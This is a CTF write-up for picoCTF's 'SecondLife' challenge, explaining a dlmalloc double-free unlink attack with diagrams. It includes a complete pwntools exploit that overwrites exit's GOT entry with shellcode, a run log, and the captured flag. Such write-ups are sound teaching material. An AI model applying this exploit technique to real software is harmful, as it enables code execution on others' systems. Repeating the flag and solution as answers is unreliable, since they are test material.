# SecondLife
Binary Exploitation, 400 points

## Description:
> Just pwn this program using a double free and get a flag.

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#define FLAG_BUFFER 200
#define LINE_BUFFER_SIZE 20

void win() {
  char buf[FLAG_BUFFER];
  FILE *f = fopen("flag.txt","r");
  fgets(buf,FLAG_BUFFER,f);
  fprintf(stdout,"%s\n",buf);
  fflush(stdout);
}

int main(int argc, char *argv[])
{
   //This is rather an artificial pieace of code taken from Secure Coding in c by Robert C. Seacord 
   char *first, *second, *third, *fourth;
   char *fifth, *sixth, *seventh;
   first=malloc(256);
   printf("Oops! a new developer copy pasted and printed an address as a decimal...\n");
   printf("%d\n",first);
   fgets(first, LINE_BUFFER_SIZE, stdin);
   second=malloc(256);
   third=malloc(256);
   fourth=malloc(256);
   free(first);
   free(third);
   fifth=malloc(128);
   free(first);
   sixth=malloc(256);
   puts("You should enter the got and the shellcode address in some specific manner... an overflow will not be very useful...");
   gets(sixth);
   seventh=malloc(256);
   exit(0);
}


```


## Solution:

As mentioned in the comment, this is an artificial example taken from [Secure Coding in C and C++](https://www.amazon.com/Secure-Coding-2nd-Software-Engineering/dp/0321822137). A complete analysis of the example exists in the book (section 4.6, Doug Lea's Memory Allocator, a.k.a. `dlmalloc`), and this writeup is inspired by it. 

In order to follow this writeup, it is useful to have some background in the internal structure of the `dlmalloc` heap. The [Heap overflow](Heap_overflow.md) writeup contains a basic explanation.

The vulnerability here is *double free*: 
```c
free(first); // <-- 'first' is freed
free(third);
fifth=malloc(128);
free(first); // <-- 'first' is freed again
```

Using this vulnerability, it is possible to write a DWORD to an arbitrary memory location, as long as the following additional conditions are met:

* The chunk being freed must be located between two occupied chunks (i.e. it must to be merged with the previous or next chunk as part of the free process)
* Some other chunk needs to be freed after the double-free chunk is freed for the first time. This is because when a chunk is freed for the first time, it is moved to a special bin which acts as a "cache bin". When another allocation is performed, the chunk in the cache bin will be checked first and if it is compliant with the allocation requirements, it will be used. If, on the other hand, another chunk has been freed while a chunk is in the cache bin, the newly freed chunk will replace the older chunk in the cache bin and the older chunk will move to a regular bin. The attack requires the double-free chunk to be in a regular bin.
* The (regular) bin to which the chunk will be added after being freed must be empty.



Let's see how these conditions are met in our example:
```c
                        // all bins are empty
   first=malloc(256);   // our target is allocated
   printf("Oops! a new developer copy pasted and printed an address as a decimal...\n");
   printf("%d\n",first);
   fgets(first, LINE_BUFFER_SIZE, stdin);
   second=malloc(256);  // Used to ensure that 'first' won't be merged
   third=malloc(256);   // Will be used to remove 'first' from the cache bin
   fourth=malloc(256);  // Used to ensure that 'third' isn't merged
   free(first);         // 'first' is freed and moved to the cache bin
   free(third);         // 'third' is freed and replaces 'first' in the cache bin, 'first' moves to a currently empty regular bin and isn't merged since 'second' is in use
   fifth=malloc(128);  
   free(first);         // Double free with all conditions met
```

Once a buffer is freed for the second time under these conditions, the internal state of the heap manager gets corrupted: The bin's doubly-linked list still points to the chunk, but the chunk itself doesn't point back to the bin. So, the chunk can still be allocated, but it is impossible to actually remove (i.e. `unlink()`) it from the bin as part of the allocation process. This brings the heap manager to a state where it will continue to provide the same chunk for all future allocation requests which match the bin criteria. 

Let's continue with the example:

```c
sixth=malloc(256);
```

The pointer returned by the heap manager is the same pointer as `first`.

Now we get a change to copy our payload:

```c
puts("You should enter the got and the shellcode address in some specific manner... an overflow will not be very useful...");
gets(sixth);
```

We'll enter the following payload:

```python
payload = p32(exe.got["exit"] - 12) + p32(address + 8) + asm('push {}; ret;'.format(hex(exe.symbols["win"])))
```

This will cause the buffer to look like:
```
                                Buffer                          Casting to free chunk
                                +------------------------+---+  +------------------------+---+
                                | Size of chunk          | 0 |  | Size of chunk          | 0 |
Pointer returned by malloc -->  +------------------------+---+  +------------------------+---+
                                | exe.got["exit"] - 12       |  | Forward Pointer            |
                                +----------------------------+  +----------------------------+
                            +---| address + 8                |  | Back Pointer               |
                            +-> +----------------------------+  +----------------------------+
                                | push 'win'; ret;           |  | Unused                     |
                                |                            |  |                            |
                                +                            +  +----------------------------+
                                |                            |  | Size of chunk              |
                                +----------------------------+  +----------------------------+
```

We add 8 bytes to `address` (which is the base address of the first/sixth/seventh buffer) since that's where we located our shellcode, right after `p32(exe.got["exit"] - 12) + p32(address + 8)`.

We continue with:
```c
seventh=malloc(256);
```

Again, the same buffer is retrieved from the bin and therefore should be removed from the linked list by calling `unlink`:
```c
FD = P->fd;  // FD points to (exe.got["exit"] - 12), since that's the value we overran the buffer with
BK = P->bk;  // BK points to (address of first/sixth/seventh + 8), since that's the value we overran the buffer with
FD->bk = BK; // (exe.got["exit"] - 12) + 12 = (address of first/sixth/seventh + 8); We wrote an arbitrary DWORD to an arbitrary location
BK->fd = FD; // (address of first/sixth/seventh + 8) + 8 = (exe.got["exit"] - 12); Side effect
```

The `unlink` macro allowed us to overwrite the .got.plt address of `exit` with the address of our shellcode. Notice that as a side-effect, a part of the buffer was overwritten. Since our shellcode is very short, it won't be corrupted. If it was longer, we would have had to use a trampoline as demonstrated in [Heap overflow](Heap_overflow.md).

Now, when we call `exit`, our shellcode gets called instead and gives us the flag.


```python
# First, generate a pwntools template using:
# pwn template --host 2019shell1.picoctf.com --user dvdalt --path /problems/secondlife_0_1d09c6c834e9512daebaf9e25feedd53/vuln

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments

import os

if shell is not None:
    shell.set_working_directory(os.path.dirname(remote_path))

io = start()

io.recvuntil("Oops! a new developer copy pasted and printed an address as a decimal...\n")
address = int(io.recvline())
io.sendline("a")

log.info("Address of buffer: {}".format(hex(address)))
log.info("Address of exit(): {}".format(hex(exe.got["exit"])))
log.info("Address of win(): {}".format(hex(exe.symbols["win"])))

payload = p32(exe.got["exit"] - 12) + p32(address + 8) + asm('push {}; ret;'.format(hex(exe.symbols["win"])))
log.info("payload:\n{}".format(hexdump(payload)))

io.sendlineafter("You should enter the got and the shellcode address in some specific manner... an overflow will not be very useful...", payload)
print io.recvall()
```

Output:
```console
root@kali:/media/sf_CTFs/pico/SecondLife# python exploit.py
[*] '/media/sf_CTFs/pico/SecondLife/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Connecting to 2019shell1.picoctf.com on port 22: Done
[*] dvdalt@2019shell1.picoctf.com:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Opening new channel: 'pwd': Done
[+] Receiving all data: Done (13B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/tmp/tmp.HYAo5mXrrn'
[+] Opening new channel: 'ln -s /home/dvdalt/* .': Done
[+] Receiving all data: Done (0B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/problems/secondlife_0_1d09c6c834e9512daebaf9e25feedd53'
[+] Starting remote process '/problems/secondlife_0_1d09c6c834e9512daebaf9e25feedd53/vuln' on 2019shell1.picoctf.com: pid 1136867
[*] Address of buffer: 0x9acd008
[*] Address of exit(): 0x804d02c
[*] Address of win(): 0x8048956
[*] payload:
    00000000  20 d0 04 08  10 d0 ac 09  68 56 89 04  08 c3        │ ···│····│hV··│··│
    0000000e
[+] Receiving all data: Done (32B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1136867)

picoCTF{HeapHeapFlag_8342a39b}
```